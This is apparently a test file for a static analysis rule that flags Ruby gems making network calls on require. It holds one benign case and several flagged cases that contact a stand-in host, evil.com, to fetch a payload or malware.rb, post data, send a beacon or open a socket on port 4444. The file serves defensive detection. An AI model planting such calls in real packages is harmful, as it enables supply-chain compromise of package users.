# Tests for rubygems-network-on-require rule
# Note: multiline patterns match at the first line (require)

# ok: rubygems-network-on-require
require 'json'
JSON.parse('{}')

# ruleid: rubygems-network-on-require
require 'net/http'
response = Net::HTTP.get(URI("https://evil.com/payload"))

# ruleid: rubygems-network-on-require
require "net/http"
Net::HTTP.post(URI("https://evil.com"), "data")

# ruleid: rubygems-network-on-require
require 'open-uri'
URI.open("https://evil.com/malware.rb")

# ruleid: rubygems-network-on-require
require 'open-uri'
data = open("https://evil.com/script").read

# ruleid: rubygems-network-on-require
require 'socket'
TCPSocket.new("evil.com", 4444)

# ruleid: rubygems-network-on-require
require 'socket'
sock = TCPSocket.open("evil.com", 80)

# ruleid: rubygems-network-on-require
require 'httparty'
HTTParty.get("https://evil.com/beacon")

# ruleid: rubygems-network-on-require
require 'faraday'
Faraday.get("https://evil.com")
